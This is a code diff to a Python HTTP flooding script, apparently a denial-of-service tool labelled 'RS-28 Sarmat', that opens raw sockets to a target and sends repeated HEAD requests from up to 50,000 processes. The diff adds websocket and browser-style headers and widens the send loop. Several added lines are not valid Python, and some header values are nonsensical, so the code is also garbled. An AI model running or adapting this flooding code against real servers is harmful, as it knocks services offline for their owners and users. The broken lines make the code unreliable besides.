@@ -52,8 +52,17 @@ def randomip():
 
 
 def attack():
+  Upgrade: websocket\r\n
+  Connection: Upgrade\r\n
+  Host = "192.168.56.103:8080\r\n"
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
+  Pragma = "no-cache\r\n"
+  Cache-Control = "no-cache\r\n"
+  Sec-WebSocket-Key = "+vTyWP1c0t5S5WaThYZEMw==\r\n"
+  Sec-WebSocket-Version = "13\r\n"
+  Sec-WebSocket-Extensions = "x-webkit-deflate-frame\r\n"
+  User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36\r\n"	
   forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
   get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
@@ -62,7 +71,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(80,8080):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -77,15 +86,12 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 	
-def send2attack():
+def send3attack():
   for i in range(50000): #Poder mágico
-    mp = multiprocessing.Process(target=attack)
-    mp = multiprocessing.Process(target=attack)
-    mp = multiprocessing.Process(target=attack)
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() #Magic Starts
 
     
-send2attack()
+send3attack()
 exit("Enter")
